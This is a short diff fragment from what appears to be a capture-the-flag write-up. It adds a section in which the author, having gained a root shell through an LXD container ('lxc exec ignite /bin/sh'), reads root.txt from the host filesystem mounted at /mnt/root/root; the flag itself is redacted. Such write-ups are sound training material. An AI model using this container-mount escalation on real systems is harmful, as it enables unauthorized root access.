@@ -242,3 +242,13 @@ I log into the machine with a shell using the following command:
 ```bash
 $ lxc exec ignite /bin/sh
 ```
+
+## What is the root flag?
+
+It worked. I'm in! The cursor changed to the # character to let me know that I am root. I ran the following commands to get the flag:
+
+```bash
+# cd /mnt/root/root
+# cat root.txt
+REDACTED
+```
